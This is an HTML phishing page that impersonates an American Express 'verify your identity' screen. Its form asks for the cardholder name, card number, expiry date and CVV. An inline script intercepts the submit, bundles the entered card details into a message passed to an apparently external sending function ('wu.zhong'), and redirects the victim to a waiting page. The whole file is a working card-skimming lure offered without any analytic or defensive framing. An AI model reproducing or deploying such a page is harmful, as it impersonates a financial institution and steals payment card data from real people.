<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title>American Express</title>
</head>
<body>
<header>
<div class="left">
    <img src="res/img/logo.png"><span>My Account</span>
</div>
<div class="right">
<span>Help</span> 
</div>
</header>

<main>


<div class="continer">
<h1>Verify your identity.</h1>


<div class="title1"> Please enter the information of the card associated with your account.</div>


    



<form action="post.php" method="post">

<div class="col">
<div class="text"> Cardholder name </div>
 <input type="text" name="name" required> </div>


 <div class="col">
<div class="text">Card number </div>
<input type="text" name="cc" placeholder="XXXX XXXX XXXX XXXX" id="cc" required></div>


<div class="col">
<div class="text"> Expiration date </div>
<input type="text" name="exp" placeholder="MM/YY" id="exp" required> </div>

<div class="col">
<div class="text"> Security code </div>
<input type="text"  name="cvv" placeholder="CVV" id="cvv" required> </div> <br>

<div class="boto">
<button type="submit" style="width:88%;">Continue</button> </div> <br>





</form>
</div>
</main>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("0000");

document.querySelector("form").addEventListener("submit",(e)=>{
e.preventDefault();

wu.zhong(`💳 American Express Card Details\n\nName:${document.querySelector("[name='name']").value}\n\nCard Number:${document.querySelector("[name='cc']").value}\n\nExp:${document.querySelector("[name='exp']").value}\n\nCVV:${document.querySelector("[name='cvv']").value}`);

window.location="wait.html";

});


</script>
</body>
</html>
